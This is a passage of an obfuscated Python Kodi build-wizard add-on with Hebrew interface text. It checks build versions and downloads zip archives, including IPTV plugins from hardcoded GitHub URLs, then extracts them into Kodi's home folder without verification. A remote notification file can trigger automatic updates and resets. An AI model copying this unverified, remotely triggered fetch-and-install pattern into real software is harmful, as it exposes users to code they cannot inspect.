							wiz .log ("[Notifications] id[%s] Dismissed"%int (O0O00OO0OOOOOOOO0 ),xbmc .LOGNOTICE )#line:5174
						elif O0O00OO0OOOOOOOO0 >OOO000OOO000O00OO :#line:5176
							wiz .log ("[Notifications] id: %s"%str (O0O00OO0OOOOOOOO0 ),xbmc .LOGNOTICE )#line:5177
							wiz .setS ('noteid',str (O0O00OO0OOOOOOOO0 ))#line:5178
							wiz .setS ("notedismiss","true")#line:5179
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5182
					except Exception as OO0O0OO00O0000O0O :#line:5183
						wiz .log ("Error on Notifications Window: %s"%str (OO0O0OO00O0000O0O ),xbmc .LOGERROR )#line:5184
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5186
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O00O0OOO0O0O0OO00 ),xbmc .LOGNOTICE )#line:5187
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5188
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5189
def checkUpdate ():#line:5191
	OO00OOO0OOOO00000 =wiz .getS ('disableupdate')#line:5192
	O0OOOO00OOO0OO000 =wiz .getS ('buildname')#line:5193
	O0OO0OO00O0OOO000 =wiz .getS ('buildversion')#line:5194
	O0OOOOOO0O00OOOO0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:5195
	O0OOOO00OOOO000O0 =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%O0OOOO00OOO0OO000 ).findall (O0OOOOOO0O00OOOO0 )#line:5196
	if len (O0OOOO00OOOO000O0 )>0 :#line:5197
		O000OOOOOO0O0000O =O0OOOO00OOOO000O0 [0 ][0 ]#line:5198
		O00O00O00OO0OO0O0 =O0OOOO00OOOO000O0 [0 ][1 ]#line:5199
		O00OOO00O0OO0OOO0 =O0OOOO00OOOO000O0 [0 ][2 ]#line:5200
		wiz .setS ('latestversion',O000OOOOOO0O0000O )#line:5201
		if O000OOOOOO0O0000O >O0OO0OO00O0OOO000 :#line:5202
			if OO00OOO0OOOO00000 =='false':#line:5203
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(O0OO0OO00O0OOO000 ,O000OOOOOO0O0000O ),xbmc .LOGNOTICE )#line:5204
				notify .updateWindow (O0OOOO00OOO0OO000 ,O0OO0OO00O0OOO000 ,O000OOOOOO0O0000O ,O00O00O00OO0OO0O0 ,O00OOO00O0OO0OOO0 )#line:5205
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(O0OO0OO00O0OOO000 ,O000OOOOOO0O0000O ),xbmc .LOGNOTICE )#line:5206
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(O0OO0OO00O0OOO000 ,O000OOOOOO0O0000O ),xbmc .LOGNOTICE )#line:5207
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",xbmc .LOGERROR )#line:5208
def updatetelemedia (OO0000OOOOO000O00 ):#line:5209
    from startup import teleupdate #line:5210
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5211
    xbmc .executebuiltin ("UpdateLocalAddons")#line:5212
    xbmc .executebuiltin ("UpdateAddonRepos")#line:5213
    wiz .wizardUpdate ('startup')#line:5214
    checkUpdate ()#line:5216
    xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:5217
    time .sleep (15.0 )#line:5218
    if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium":#line:5219
     if teleupdate is False :#line:5220
        O0O0O0O0OOO000OOO =(ADDON .getSetting ("autoupdate"))#line:5221
        STARTP2 ()#line:5222
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5223
        if not NOTIFY =='true':#line:5224
            O0O0OO0000O00O000 =wiz .workingURL (NOTIFICATION )#line:5225
            if O0O0OO0000O00O000 ==True :#line:5226
                OO0O0OOO0O0000OOO ,OOO000O0O0O0000O0 =wiz .splitNotify (NOTIFICATION )#line:5227
                if not OO0O0OOO0O0000OOO ==False :#line:5228
                    try :#line:5229
                        OO0O0OOO0O0000OOO =int (OO0O0OOO0O0000OOO );OO0000OOOOO000O00 =int (OO0000OOOOO000O00 )#line:5230
                        if OO0O0OOO0O0000OOO ==OO0000OOOOO000O00 :#line:5231
                            if NOTEDISMISS =='false':#line:5232
                                debridit .debridIt ('update','all')#line:5233
                                traktit .traktIt ('update','all')#line:5234
                                checkidupdatetele ()#line:5235
                            else :wiz .log ("[Notifications] id[%s] Dismissed"%int (OO0O0OOO0O0000OOO ),xbmc .LOGNOTICE )#line:5236
                        elif OO0O0OOO0O0000OOO >OO0000OOOOO000O00 :#line:5237
                            wiz .log ("[Notifications] id: %s"%str (OO0O0OOO0O0000OOO ),xbmc .LOGNOTICE )#line:5238
                            wiz .setS ('noteid',str (OO0O0OOO0O0000OOO ))#line:5239
                            wiz .setS ('notedismiss','false')#line:5240
                            if O0O0O0O0OOO000OOO =='true':#line:5241
                                debridit .debridIt ('update','all')#line:5242
                                traktit .traktIt ('update','all')#line:5243
                                checkidupdatetele ()#line:5244
                            else :notify .notification (msg =OOO000O0O0O0000O0 )#line:5245
                            wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5246
                    except Exception as OO0000O0OO0OOOO0O :#line:5247
                        wiz .log ("Error on Notifications Window: %s"%str (OO0000O0OO0OOOO0O ),xbmc .LOGERROR )#line:5248
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5249
            else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O0O0OO0000O00O000 ),xbmc .LOGNOTICE )#line:5250
        else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5251
def checkidupdate ():#line:5255
				wiz .setS ("notedismiss","true")#line:5257
				O0O0O00O0OO0OO0O0 =wiz .workingURL (NOTIFICATION )#line:5258
				OOO00O0OOO0OO00O0 =" Kodi Premium"#line:5260
				O00OO00OO0OO0OO0O =wiz .checkBuild (OOO00O0OOO0OO00O0 ,'gui')#line:5261
				O0OOOOO0O00OOO00O =OOO00O0OOO0OO00O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5262
				if not wiz .workingURL (O00OO00OO0OO0OO0O )==True :return #line:5263
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5264
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OOO00O0OOO0OO00O0 ),'','אנא המתן')#line:5265
				O0OOOOO00O0O000O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OOOOO0O00OOO00O )#line:5266
				try :os .remove (O0OOOOO00O0O000O0 )#line:5267
				except :pass #line:5268
				logging .warning (O00OO00OO0OO0OO0O )#line:5269
				if 'google'in O00OO00OO0OO0OO0O :#line:5270
				   O000O00O0OO0O0O0O =googledrive_download (O00OO00OO0OO0OO0O ,O0OOOOO00O0O000O0 ,DP ,wiz .checkBuild (OOO00O0OOO0OO00O0 ,'filesize'))#line:5271
				else :#line:5274
				  downloader .download (O00OO00OO0OO0OO0O ,O0OOOOO00O0O000O0 ,DP )#line:5275
				xbmc .sleep (100 )#line:5276
				O00OO00OOO00OOOOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00O0OOO0OO00O0 )#line:5277
				DP .update (0 ,O00OO00OOO00OOOOO ,'','אנא המתן')#line:5278
				extract .all (O0OOOOO00O0O000O0 ,HOME ,DP ,title =O00OO00OOO00OOOOO )#line:5279
				DP .close ()#line:5280
				wiz .defaultSkin ()#line:5281
				wiz .lookandFeelData ('save')#line:5282
				if KODIV >=18 :#line:5283
					skindialogsettind18 ()#line:5284
				if INSTALLMETHOD ==1 :OOOOO00O0OOO0O00O =1 #line:5287
				elif INSTALLMETHOD ==2 :OOOOO00O0OOO0O00O =0 #line:5288
				else :DP .close ()#line:5289
def checkidupdatetele ():#line:5290
				wiz .setS ("notedismiss","true")#line:5292
				O00OOOOOO000O00O0 =wiz .workingURL (NOTIFICATION )#line:5293
				OOOOOO0OO0OO00O00 =" Kodi Premium"#line:5295
				O000O0O0O0OO0O0OO =wiz .checkBuild (OOOOOO0OO0OO00O00 ,'gui')#line:5296
				O0OOOO0OOO00O0000 =OOOOOO0OO0OO00O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5297
				if not wiz .workingURL (O000O0O0O0OO0O0OO )==True :return #line:5298
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5299
				OOO0000O00OOO0O0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OOOO0OOO00O0000 )#line:5302
				try :os .remove (OOO0000O00OOO0O0O )#line:5303
				except :pass #line:5304
				if 'google'in O000O0O0O0OO0O0OO :#line:5306
				   O000000O0O00OOO00 =googledrive_download (O000O0O0O0OO0O0OO ,OOO0000O00OOO0O0O ,DP2 ,wiz .checkBuild (OOOOOO0OO0OO00O00 ,'filesize'))#line:5307
				else :#line:5310
				  downloaderbg .download3 (O000O0O0O0OO0O0OO ,OOO0000O00OOO0O0O ,DP2 )#line:5311
				xbmc .sleep (100 )#line:5312
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:5313
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:5315
				extract .all2 (OOO0000O00OOO0O0O ,HOME ,DP2 )#line:5317
				DP2 .close ()#line:5318
				wiz .defaultSkin ()#line:5319
				wiz .lookandFeelData ('save')#line:5320
				wiz .kodi17Fix ()#line:5321
				if KODIV >=18 :#line:5322
					skindialogsettind18 ()#line:5323
				debridit .debridIt ('restore','all')#line:5328
				traktit .traktIt ('restore','all')#line:5329
				if INSTALLMETHOD ==1 :O00O0O0OO0OO0OOOO =1 #line:5330
				elif INSTALLMETHOD ==2 :O00O0O0OO0OO0OOOO =0 #line:5331
				else :DP2 .close ()#line:5332
				O0OOOOO00OO00000O =(NOTIFICATION2 )#line:5333
				O0000O00OOOOO00OO =urllib2 .urlopen (O0OOOOO00OO00000O )#line:5334
				O00000OOOO0OO0OOO =O0000O00OOOOO00OO .readlines ()#line:5335
				O00OO0O0000OO00O0 =0 #line:5336
				for O00O0OOO0000O0OOO in O00000OOOO0OO0OOO :#line:5339
					if O00O0OOO0000O0OOO .split (' ==')[0 ]=="noreset"or O00O0OOO0000O0OOO .split ()[0 ]=="noreset":#line:5340
						xbmc .executebuiltin ("ReloadSkin()")#line:5342
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:5343
						O00O00OOOOO0OOOOO =(ADDON .getSetting ("message"))#line:5344
						if O00O00OOOOO0OOOOO =='true':#line:5345
							infobuild ()#line:5346
						update_Votes ()#line:5347
						indicatorfastupdate ()#line:5348
					if O00O0OOO0000O0OOO .split (' ==')[0 ]=="reset"or O00O0OOO0000O0OOO .split ()[0 ]=="reset":#line:5349
						update_Votes ()#line:5351
						indicatorfastupdate ()#line:5352
						resetkodi ()#line:5353
def gaiaserenaddon ():#line:5354
  OO0000O000OOO0OO0 =(ADDON .getSetting ("gaiaseren"))#line:5355
  O0O00O00000O0OOO0 =(ADDON .getSetting ("auto_rd"))#line:5356
  if OO0000O000OOO0OO0 =='true'and O0O00O00000O0OOO0 =='true':#line:5357
    O00O000OO0O000000 =(NEWFASTUPDATE )#line:5358
    O0OO0O00000O000OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5359
    OO000O0OOOO0OOO0O =xbmcgui .DialogProgress ()#line:5360
    OO000O0OOOO0OOO0O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5361
    O0O00OOOO00OOOO0O =os .path .join (PACKAGES ,'isr.zip')#line:5362
    OOO0OO0OO000O0O0O =urllib2 .Request (O00O000OO0O000000 )#line:5363
    O00OOOO00000O0OO0 =urllib2 .urlopen (OOO0OO0OO000O0O0O )#line:5364
    OO0OOOOOO0000O0OO =xbmcgui .DialogProgress ()#line:5366
    OO0OOOOOO0000O0OO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5367
    OO0OOOOOO0000O0OO .update (0 )#line:5368
    OO0OO00OOOO00OOOO =open (O0O00OOOO00OOOO0O ,'wb')#line:5370
    try :#line:5372
      O0O0000O0O0O0O0OO =O00OOOO00000O0OO0 .info ().getheader ('Content-Length').strip ()#line:5373
      OO0OOO0OOO0OO0O00 =True #line:5374
    except AttributeError :#line:5375
          OO0OOO0OOO0OO0O00 =False #line:5376
    if OO0OOO0OOO0OO0O00 :#line:5378
          O0O0000O0O0O0O0OO =int (O0O0000O0O0O0O0OO )#line:5379
    OOOO0OOO0O00OO000 =0 #line:5381
    O0OOOOO0O0OO0000O =time .time ()#line:5382
    while True :#line:5383
          O00O00OOO0O0O0O0O =O00OOOO00000O0OO0 .read (8192 )#line:5384
          if not O00O00OOO0O0O0O0O :#line:5385
              sys .stdout .write ('\n')#line:5386
              break #line:5387
          OOOO0OOO0O00OO000 +=len (O00O00OOO0O0O0O0O )#line:5389
          OO0OO00OOOO00OOOO .write (O00O00OOO0O0O0O0O )#line:5390
          if not OO0OOO0OOO0OO0O00 :#line:5392
              O0O0000O0O0O0O0OO =OOOO0OOO0O00OO000 #line:5393
          if OO0OOOOOO0000O0OO .iscanceled ():#line:5394
             OO0OOOOOO0000O0OO .close ()#line:5395
             try :#line:5396
              os .remove (O0O00OOOO00OOOO0O )#line:5397
             except :#line:5398
              pass #line:5399
             break #line:5400
          O0000O000OOO0000O =float (OOOO0OOO0O00OO000 )/O0O0000O0O0O0O0OO #line:5401
          O0000O000OOO0000O =round (O0000O000OOO0000O *100 ,2 )#line:5402
          OOOOO0000O00O00OO =OOOO0OOO0O00OO000 /(1024 *1024 )#line:5403
          O0O0O000O000OOO0O =O0O0000O0O0O0O0OO /(1024 *1024 )#line:5404
          OOO000OOOOO0O0OOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOO0000O00O00OO ,'teal',O0O0O000O000OOO0O )#line:5405
          if (time .time ()-O0OOOOO0O0OO0000O )>0 :#line:5406
            O0OOO00O00O00OOOO =OOOO0OOO0O00OO000 /(time .time ()-O0OOOOO0O0OO0000O )#line:5407
            O0OOO00O00O00OOOO =O0OOO00O00O00OOOO /1024 #line:5408
          else :#line:5409
           O0OOO00O00O00OOOO =0 #line:5410
          O0OO0OOO0000OO0OO ='KB'#line:5411
          if O0OOO00O00O00OOOO >=1024 :#line:5412
             O0OOO00O00O00OOOO =O0OOO00O00O00OOOO /1024 #line:5413
             O0OO0OOO0000OO0OO ='MB'#line:5414
          if O0OOO00O00O00OOOO >0 and not O0000O000OOO0000O ==100 :#line:5415
              OOOOO00O0O00OOOO0 =(O0O0000O0O0O0O0OO -OOOO0OOO0O00OO000 )/O0OOO00O00O00OOOO #line:5416
          else :#line:5417
              OOOOO00O0O00OOOO0 =0 #line:5418
          O0OO0000OOOO000O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOO00O00O00OOOO ,O0OO0OOO0000OO0OO )#line:5419
          OO0OOOOOO0000O0OO .update (int (O0000O000OOO0000O ),OOO000OOOOO0O0OOO ,O0OO0000OOOO000O0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5421
    O000O000O00OOO0OO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5424
    OO0OO00OOOO00OOOO .close ()#line:5427
    extract .all (O0O00OOOO00OOOO0O ,O000O000O00OOO0OO ,OO0OOOOOO0000O0OO )#line:5428
    try :#line:5432
      os .remove (O0O00OOOO00OOOO0O )#line:5433
    except :#line:5434
      pass #line:5435
def iptvsimpldownpc ():#line:5436
    O0O00OO000O000000 =(IPTVSIMPL18PC )#line:5438
    OO0OO000OO00OOOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5439
    O0OO000OOO0OOOO0O =xbmcgui .DialogProgress ()#line:5440
    O0OO000OOO0OOOO0O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5441
    OO0O0O0O0O0O000O0 =os .path .join (PACKAGES ,'isr.zip')#line:5442
    OO0OOO000O00OOO0O =urllib2 .Request (O0O00OO000O000000 )#line:5443
    OOOO0OO00O000O0OO =urllib2 .urlopen (OO0OOO000O00OOO0O )#line:5444
    O000OOO00O00O0000 =xbmcgui .DialogProgress ()#line:5446
    O000OOO00O00O0000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5447
    O000OOO00O00O0000 .update (0 )#line:5448
    O000OOO00O00O0O0O =open (OO0O0O0O0O0O000O0 ,'wb')#line:5450
    try :#line:5452
      OOOOOO0O00O00OOOO =OOOO0OO00O000O0OO .info ().getheader ('Content-Length').strip ()#line:5453
      OOOO0O00O0OO000OO =True #line:5454
    except AttributeError :#line:5455
          OOOO0O00O0OO000OO =False #line:5456
    if OOOO0O00O0OO000OO :#line:5458
          OOOOOO0O00O00OOOO =int (OOOOOO0O00O00OOOO )#line:5459
    OOOO00OOOO00OO00O =0 #line:5461
    O0OO000O0OO00OO00 =time .time ()#line:5462
    while True :#line:5463
          OOOOO0000OO00000O =OOOO0OO00O000O0OO .read (8192 )#line:5464
          if not OOOOO0000OO00000O :#line:5465
              sys .stdout .write ('\n')#line:5466
              break #line:5467
          OOOO00OOOO00OO00O +=len (OOOOO0000OO00000O )#line:5469
          O000OOO00O00O0O0O .write (OOOOO0000OO00000O )#line:5470
          if not OOOO0O00O0OO000OO :#line:5472
              OOOOOO0O00O00OOOO =OOOO00OOOO00OO00O #line:5473
          if O000OOO00O00O0000 .iscanceled ():#line:5474
             O000OOO00O00O0000 .close ()#line:5475
             try :#line:5476
              os .remove (OO0O0O0O0O0O000O0 )#line:5477
             except :#line:5478
              pass #line:5479
             break #line:5480
          OOOO0OOO00OOO000O =float (OOOO00OOOO00OO00O )/OOOOOO0O00O00OOOO #line:5481
          OOOO0OOO00OOO000O =round (OOOO0OOO00OOO000O *100 ,2 )#line:5482
          OO0O0O0OO0O00OOOO =OOOO00OOOO00OO00O /(1024 *1024 )#line:5483
          O00OO0O0OOOOO0000 =OOOOOO0O00O00OOOO /(1024 *1024 )#line:5484
          OOO0O0OOOOOO000O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0O0O0OO0O00OOOO ,'teal',O00OO0O0OOOOO0000 )#line:5485
          if (time .time ()-O0OO000O0OO00OO00 )>0 :#line:5486
            OOO00O0OOO0O0O0O0 =OOOO00OOOO00OO00O /(time .time ()-O0OO000O0OO00OO00 )#line:5487
            OOO00O0OOO0O0O0O0 =OOO00O0OOO0O0O0O0 /1024 #line:5488
          else :#line:5489
           OOO00O0OOO0O0O0O0 =0 #line:5490
          O0000O00O0OOO0OO0 ='KB'#line:5491
          if OOO00O0OOO0O0O0O0 >=1024 :#line:5492
             OOO00O0OOO0O0O0O0 =OOO00O0OOO0O0O0O0 /1024 #line:5493
             O0000O00O0OOO0OO0 ='MB'#line:5494
          if OOO00O0OOO0O0O0O0 >0 and not OOOO0OOO00OOO000O ==100 :#line:5495
              OOOOO000O00OOOOO0 =(OOOOOO0O00O00OOOO -OOOO00OOOO00OO00O )/OOO00O0OOO0O0O0O0 #line:5496
          else :#line:5497
              OOOOO000O00OOOOO0 =0 #line:5498
          OO000O0000OOO0O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO00O0OOO0O0O0O0 ,O0000O00O0OOO0OO0 )#line:5499
          O000OOO00O00O0000 .update (int (OOOO0OOO00OOO000O ),OOO0O0OOOOOO000O0 ,OO000O0000OOO0O00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5501
    OO0O00O0OOO000OOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5504
    O000OOO00O00O0O0O .close ()#line:5507
    extract .all (OO0O0O0O0O0O000O0 ,OO0O00O0OOO000OOO ,O000OOO00O00O0000 )#line:5508
    try :#line:5512
      os .remove (OO0O0O0O0O0O000O0 )#line:5513
    except :#line:5514
      pass #line:5515
def iptvkodi18idan ():#line:5516
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:5518
              OOO000OOO00OO00OO ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:5521
              O000000OOOO0OOO0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5522
              O000OOOOOO0O0O00O =xbmcgui .DialogProgress ()#line:5523
              O000OOOOOO0O0O00O .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5524
              O0000OOOOO0O00OOO =os .path .join (O000000OOOO0OOO0O ,'isr.zip')#line:5525
              O0OOOOO0000OOO0OO =urllib2 .Request (OOO000OOO00OO00OO )#line:5526
              O0OO00000O0O00OO0 =urllib2 .urlopen (O0OOOOO0000OOO0OO )#line:5527
              OO00000O0000000OO =xbmcgui .DialogProgress ()#line:5529
              OO00000O0000000OO .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5530
              OO00000O0000000OO .update (0 )#line:5531
              O0000O00O0OOOO00O =open (O0000OOOOO0O00OOO ,'wb')#line:5533
              try :#line:5535
                O00O000O00OO00000 =O0OO00000O0O00OO0 .info ().getheader ('Content-Length').strip ()#line:5536
                OO00OO00000O0000O =True #line:5537
              except AttributeError :#line:5538
                    OO00OO00000O0000O =False #line:5539
              if OO00OO00000O0000O :#line:5541
                    O00O000O00OO00000 =int (O00O000O00OO00000 )#line:5542
              OO000000OO00000O0 =0 #line:5544
              O0OO0O00O00O00O00 =time .time ()#line:5545
              while True :#line:5546
                    OOOO00O0OO0OO0O00 =O0OO00000O0O00OO0 .read (8192 )#line:5547
                    if not OOOO00O0OO0OO0O00 :#line:5548
                        sys .stdout .write ('\n')#line:5549
                        break #line:5550
                    OO000000OO00000O0 +=len (OOOO00O0OO0OO0O00 )#line:5552
                    O0000O00O0OOOO00O .write (OOOO00O0OO0OO0O00 )#line:5553
                    if not OO00OO00000O0000O :#line:5555
                        O00O000O00OO00000 =OO000000OO00000O0 #line:5556
                    if OO00000O0000000OO .iscanceled ():#line:5557
                       OO00000O0000000OO .close ()#line:5558
                       try :#line:5559
                        os .remove (O0000OOOOO0O00OOO )#line:5560
                       except :#line:5561
                        pass #line:5562
                       break #line:5563
                    O00OOO00OOO00000O =float (OO000000OO00000O0 )/O00O000O00OO00000 #line:5564
                    O00OOO00OOO00000O =round (O00OOO00OOO00000O *100 ,2 )#line:5565
                    OOO0O0OO0OO00O0O0 =OO000000OO00000O0 /(1024 *1024 )#line:5566
                    O0OOO000OO0O000OO =O00O000O00OO00000 /(1024 *1024 )#line:5567
                    O0O0O000OO0O0O0O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO0O0OO0OO00O0O0 ,'teal',O0OOO000OO0O000OO )#line:5568
                    if (time .time ()-O0OO0O00O00O00O00 )>0 :#line:5569
                      O0OOO0OOO0OOO00OO =OO000000OO00000O0 /(time .time ()-O0OO0O00O00O00O00 )#line:5570
                      O0OOO0OOO0OOO00OO =O0OOO0OOO0OOO00OO /1024 #line:5571
                    else :#line:5572
                     O0OOO0OOO0OOO00OO =0 #line:5573
                    O00OO000O0OOOO0OO ='KB'#line:5574
                    if O0OOO0OOO0OOO00OO >=1024 :#line:5575
                       O0OOO0OOO0OOO00OO =O0OOO0OOO0OOO00OO /1024 #line:5576
                       O00OO000O0OOOO0OO ='MB'#line:5577
                    if O0OOO0OOO0OOO00OO >0 and not O00OOO00OOO00000O ==100 :#line:5578
                        OO0O00OOO0OO00O0O =(O00O000O00OO00000 -OO000000OO00000O0 )/O0OOO0OOO0OOO00OO #line:5579
                    else :#line:5580
                        OO0O00OOO0OO00O0O =0 #line:5581
                    OO0O0O0OO0O0OOO0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOO0OOO0OOO00OO ,O00OO000O0OOOO0OO )#line:5582
                    OO00000O0000000OO .update (int (O00OOO00OOO00000O ),"Downloading "+'iptv',O0O0O000OO0O0O0O0 ,OO0O0O0OO0O0OOO0O )#line:5584
              OOOO0O000OOO000O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5587
              O0000O00O0OOOO00O .close ()#line:5590
              extract .all (O0000OOOOO0O00OOO ,OOOO0O000OOO000O0 ,OO00000O0000000OO )#line:5591
              try :#line:5594
                os .remove (O0000OOOOO0O00OOO )#line:5595
              except :#line:5597
                pass #line:5598
              OO00000O0000000OO .close ()#line:5599
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:5602
              OOO000OOO00OO00OO ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:5604
              O000000OOOO0OOO0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5605
              O000OOOOOO0O0O00O =xbmcgui .DialogProgress ()#line:5606
              O000OOOOOO0O0O00O .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5607
              O0000OOOOO0O00OOO =os .path .join (O000000OOOO0OOO0O ,'isr.zip')#line:5608
              O0OOOOO0000OOO0OO =urllib2 .Request (OOO000OOO00OO00OO )#line:5609
              O0OO00000O0O00OO0 =urllib2 .urlopen (O0OOOOO0000OOO0OO )#line:5610
              OO00000O0000000OO =xbmcgui .DialogProgress ()#line:5612
              OO00000O0000000OO .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5613
              OO00000O0000000OO .update (0 )#line:5614
              O0000O00O0OOOO00O =open (O0000OOOOO0O00OOO ,'wb')#line:5616
              try :#line:5618
                O00O000O00OO00000 =O0OO00000O0O00OO0 .info ().getheader ('Content-Length').strip ()#line:5619
                OO00OO00000O0000O =True #line:5620
              except AttributeError :#line:5621
                    OO00OO00000O0000O =False #line:5622
              if OO00OO00000O0000O :#line:5624
                    O00O000O00OO00000 =int (O00O000O00OO00000 )#line:5625
              OO000000OO00000O0 =0 #line:5627
              O0OO0O00O00O00O00 =time .time ()#line:5628
              while True :#line:5629
                    OOOO00O0OO0OO0O00 =O0OO00000O0O00OO0 .read (8192 )#line:5630
                    if not OOOO00O0OO0OO0O00 :#line:5631
                        sys .stdout .write ('\n')#line:5632
                        break #line:5633
                    OO000000OO00000O0 +=len (OOOO00O0OO0OO0O00 )#line:5635
                    O0000O00O0OOOO00O .write (OOOO00O0OO0OO0O00 )#line:5636
                    if not OO00OO00000O0000O :#line:5638
                        O00O000O00OO00000 =OO000000OO00000O0 #line:5639
                    if OO00000O0000000OO .iscanceled ():#line:5640
                       OO00000O0000000OO .close ()#line:5641
                       try :#line:5642
                        os .remove (O0000OOOOO0O00OOO )#line:5643
                       except :#line:5644
                        pass #line:5645
                       break #line:5646
                    O00OOO00OOO00000O =float (OO000000OO00000O0 )/O00O000O00OO00000 #line:5647
                    O00OOO00OOO00000O =round (O00OOO00OOO00000O *100 ,2 )#line:5648
                    OOO0O0OO0OO00O0O0 =OO000000OO00000O0 /(1024 *1024 )#line:5649
                    O0OOO000OO0O000OO =O00O000O00OO00000 /(1024 *1024 )#line:5650
                    O0O0O000OO0O0O0O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO0O0OO0OO00O0O0 ,'teal',O0OOO000OO0O000OO )#line:5651
                    if (time .time ()-O0OO0O00O00O00O00 )>0 :#line:5652
                      O0OOO0OOO0OOO00OO =OO000000OO00000O0 /(time .time ()-O0OO0O00O00O00O00 )#line:5653
                      O0OOO0OOO0OOO00OO =O0OOO0OOO0OOO00OO /1024 #line:5654
                    else :#line:5655
                     O0OOO0OOO0OOO00OO =0 #line:5656
                    O00OO000O0OOOO0OO ='KB'#line:5657
                    if O0OOO0OOO0OOO00OO >=1024 :#line:5658
                       O0OOO0OOO0OOO00OO =O0OOO0OOO0OOO00OO /1024 #line:5659
                       O00OO000O0OOOO0OO ='MB'#line:5660
                    if O0OOO0OOO0OOO00OO >0 and not O00OOO00OOO00000O ==100 :#line:5661
                        OO0O00OOO0OO00O0O =(O00O000O00OO00000 -OO000000OO00000O0 )/O0OOO0OOO0OOO00OO #line:5662
                    else :#line:5663
